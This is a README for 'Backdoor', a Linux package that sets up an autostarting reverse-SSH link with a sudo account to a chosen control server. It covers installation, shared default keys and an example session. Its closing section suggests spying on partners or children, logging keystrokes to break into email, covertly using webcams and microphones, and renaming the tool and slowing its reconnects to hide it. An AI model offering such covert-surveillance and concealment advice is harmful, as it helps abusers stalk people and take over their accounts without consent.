Backdoor
========

Copyright:: Copyright (c) 2014 Scott Carlson  <sacarlson@ipipi.com>

## What is Backdoor?
Backdoor is a quick and easy method to install and setup remote ssh access between two Linux systems with the remote side being behind a NATed firewall by using a reverse ssh method to accomplish it.  Optionally if set you can have sudo privileges on this remote box.  This may be considered by some to be much like Trojan software, But we hope to see it used more for good than bad.

## Backdoor details
The Backdoor install provides the option to autostart at boot a connection on the remote system to attempt to connect to an chosen accessible ssh server over the internet or on a local network or both, that you can select at install time that will be used as the control point for the backdoor remote system.  Backdoor is also installed on the ssh server control point side in the none autostart mode, to provide it with the needed ssh keys that will match whats needed to connect to remote side to allow it access without a passwords to that remote.  This may sound like it could be a security problem since we distribute mostly the same key sets to everyone but in reality when the remote side logs into the server side for the first time with rssh selected, then even with the ssh keys for the accounts created it has no options or commands allowed with the restricted shell rssh provided in this created account, only a connection is allowed.  The control side will have to login to another account other than the one used to make the initial connection to the remote side and have knowledge of passwords to login to another account.  If you want to control in both directions on the account created by backdoor with the disabled rssh mode then it's best you create a new set of ssh keys for these accounts shortly after it is installed by disableing the rssh mode at install time to provide a normal bash shell at login.  Also see the added info bellow on the backdoor-keygen command that's added in this package to make it quick and easy to create a new set of ssh keys for both sides of backdoor with a single command that auto updates the key set on both sides at the same time.

##License:
 GPLv3 see http://www.gnu.org for details

##Requirements:
* Standard PC computer with resources to run at least a server version of Ubuntu, mint or other debian derivative.

* Linux Mint version 16 - 17, Ubuntu version 13.10 - 14.04 have been tested, many others version will also work

* Will run on i386 or amd64 and I would assume most other supported platforms
 

##Features:

* Very quick and Easy debian package installation to install on Linux Mint or Ubuntu and possibly other Debian derivatives.

* Auto creation of a selectable BackDoor sudo account (default name backdoor)

* Optionally set the backdoor account on ether or both sides to rssh mode will be restricted to connections with an rssh restricted shell 

* Optionally set autostart at boot mode to have the backdoor system  attempt to auto connect to the control point URL at power up boot time.

* Settable control point URL address at install time for the remote side of backdoor


* Selectable ssh reverse port number at install time from remote backdoor install


* Update, create fresh ssh keys on both remote and control point of backdoor with the added command script backdoor-genkey to auto update the backdoor ssh keys on both the remote and control point with a single command.

* Enable and disable the restricted rssh shell after install on eather the remote or control point sides with the backdoor_restrict command.

* Very small size package size of only about 1.2kb due to most of backdoor is just a group of dependencies and small bash scripts. 

 
 
##Installation:
 Simplified install instructions:

 ```
git clone https://github.com/sacarlson/backdoor.git
cd ./backdoor
sudo apt-get update
sudo gdebi ./backdoor-X.X-X.deb

```

This will install all the dependencies needed and ask you the needed questions to complete the install of backdoor.
There are default values filled in as examples of what is expected.  Optionally I found it also installs with a simple double click of the deb file in most file managers like Caja or Nautilus.  Note the name of the deb file the "X" will change with different updates of backdoor example first release name backdoor-1.0-1.deb .  I will also provide links to the deb file at my Google drive account at some point.

## Option 2 install just double click backdoor-X.X-X.deb file in file manager for gui install

[[https://github.com/sacarlson/Backdoor/wiki/images/backdoor_screenshot.png]]

## The values of params that are asked for and can be changed in backdoor at install time include:
*  The user account name that will be created if it doesn't exist already
*  password for the created user account above.  This does nothing if the account already exists
*  the primary URL address or IP address of an ssh server that will be used as the control point
*  The backup URL another URL or ip address that will be attempted if the primary above fails to connect.
*  port number that ssh traffic will be redirected on the ssh server control point side
*  check box to enable rssh restricted shell access to the created account
*  check box to enable autostart backdoor at power up boot and auto retry over time.

## Example session and setup:

Computer A   IP address 192.168.2.1 with dns lookup name of nobody.com.  This computer will be used  as control point computer for the human operator

Computer B   IP address 192.168.3.1 to be the computer to be remote controlled and is behind a one way NATed firewall that no direct attempt with ssh in can access.

Computer A installs backdoor with default settings but disables the autostart check button and also checks the rssh box restricted shell button.

Computer B installs backdoor with default settings but changes the primary URL to the addresses of Computer A's  dns lookup name in this case nobody.com and optionally change the urlbackup to computer A's IP address of 192.168.2.1  and also checks the box for rssh restricted box for restricted rssh shell access to the created account for optional added security. 

After the installs above in a few minutes if all went as planed computer B should now have made a reverse ssh connection to computer A . and this will be attempted  by computer B every time computer B boots. every few minutes it will also retry if it fails the first time to connect.

Now if computer A wants to ssh into computer B from any account on computer A to any account on computer B that exist on computer B,  he should be able to do something like  this from computer A:
ssh  anyaccountonB@localhost -p 7000

This will connect computer A to the account anyacountonB on computer B over the reverse ssh connection just the same as if you are connecting with direct ssh to it.  The same authorization must be provided to login to the accounts on computer B  as if you were using the direct forward ssh method.  Also note in the command above we use localhost to connect to our own computer  and the -p 7000  is the port that in this case we connected to ourself with that will be redirected to the remote computer B.  Also this  port address can be changed at install time, port  7000 is just the default value.  

In a slightly modified example to the above, if you also wanted computer B to be able to ssh into computer A from the account created by backdoor with normal sudo privileges that are by default added to this account, then you would have to uncheck the rssh button at install time on both the computer A and B installs.  Now you can login to the created account  on computer B to be able to ssh into computer A with the same account name with the provided ssh keys that were auto installed by backdoor and with sudo privileges.  Be careful if you use this method you should create a new set of ssh keys as soon as possible  or you will be providing hackers with a security hole to attempt to break into using a published key set.  Also be careful if you change the created account to an account that already exists and that's the only sudo account on the system then be SURE you don't click the rssh button or you will have a hard time getting sudo control back on this system from that mostly locked account.  Also note it might be best to make a new set a ssh keys in any case at some point after install, as I may have missed some security item at some point in this project.

## added backdoor command tools

## backdoor_genkeys  tool:
Later I added this script to setup a new set of ssh keys on both sides for Backdoor called backdoor_genkeys.
* You must have backdoor installed on both sides with rssh mode disabled on both sides for this to work.
* Also you need to login to the backdoor account before you run this (sudo with root won't work)
 example sudo su backdoor <cr> backdoor_genkeys
* run this on the backdoor computer system side that can connect direct with a forward ssh connection to the other paired Backdoor
* After complete you will have to manually restart the backdoor ssh connection on both sides to get the new keys to be used.

## backdoor_restrict tool:
 enable or disable rssh restricted shell on the present installed backdoor account
 example to restrict the backdoor account:
 sudo backdoor_restrict enable
 default is to disable rssh shell so just run backdoor_restricted with or without parameter to disable
 be careful enabling rssh if the backdoor account is also the only sudo account on the system
 you will lock yourself out as sudo.  it can be fixed but it can be a bummer if you do.

## What's Backdoor good for and how can it be used?
 Backdoor has 101+ different ways of being useful or in not so nice ways.  Here are just a few off the top of my head.  First it's the easy way to help a friend that is having problems on his Linux computer were they aren't quite as smart as you are.  You can provide them the simple instructions to install backdoor with 3 clicks and in no time remote into his system to fix their problems.  Or not as nice things like spy on your girl friend or wife or your kids or just keep an eye on your apartment or hotel room when your gone, monitor  key strokes to break into email and other accounts.  Turn the web cam on and keep an eye on things.  Listen to the sounds in a remote room.  Download a file you forgot on the computer you left running someplace. backdoor can be used to provide a method to try to locate a stolen computer.  If the crook ever connects your stolen system to the Internet you could do all kinds of cool stuff over the auto connected remote ssh link like take his picture, record voices.  Monitor IP address to get a geolocation and many more things.   I also can't stop bad people from doing bad things with what I create so I hope more good than bad comes of the backdoor system.  Remember backdoor runs in the background so most people unless they are computer savvy would never have a clue that it was running.  If you wanted to hide it better maybe change the name to something not so obvious and have it activate less frequently.   From ssh you can also view a remote desktop and control it using remote-desktop that can be activated over ssh.  I won't go into detail about this as you can research it on Google.  It's all up to you and your imagination what you all end up using Backdoor for.

 
 I would also welcome others input to add documentation for install and usage.  Any other feedback is always welcome, good or bad.

For more details, updates and examples see:
* [Backdoor wiki](https://github.com/sacarlson/Backdoor/wiki)

